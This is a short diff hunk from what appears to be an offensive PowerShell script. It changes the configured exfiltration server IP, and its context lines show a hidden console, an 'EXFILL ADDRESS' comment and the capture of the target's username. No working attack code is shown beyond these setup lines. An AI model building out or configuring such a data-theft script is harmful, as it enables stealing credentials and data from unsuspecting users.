@@ -23,7 +23,7 @@ Hide-Console
 
 
 # EXFILL ADDRESS (PLEASE EDIT THIS!!)
-$exfilServer = "192.168.111.10"
+$exfilServer = "192.168.200.2"
 
 # prompt
 $targetUser = $env:username
